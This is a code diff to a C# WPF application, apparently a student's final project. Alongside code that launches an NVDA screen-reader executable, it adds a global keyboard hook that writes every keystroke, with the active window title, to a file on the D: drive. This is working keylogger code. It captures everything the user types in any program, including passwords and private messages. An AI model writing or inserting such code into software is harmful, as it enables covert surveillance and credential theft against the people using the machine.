@@ -12,6 +12,8 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Shapes;
 using System.Diagnostics;
+using Keystroke.API;
+using System.IO;
 
 namespace AbschlussprojektWPF
 {
@@ -46,6 +48,15 @@ namespace AbschlussprojektWPF
             {
                 Process.Start(@"C:\Program Files\NVDA\mynvda.exe");
             }
+
+            using (var api = new KeystrokeAPI())
+            {
+                Logger logFile = new Logger(); 
+                KeystrokeAPI ki = new KeystrokeAPI();
+                api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "\r\n\r\n"); ; });
+            }
+            wndMessageBoxStartLog wndMessageBoxStartedLog = new wndMessageBoxStartLog();
+            wndMessageBoxStartedLog.Show();
         }
     }
 }
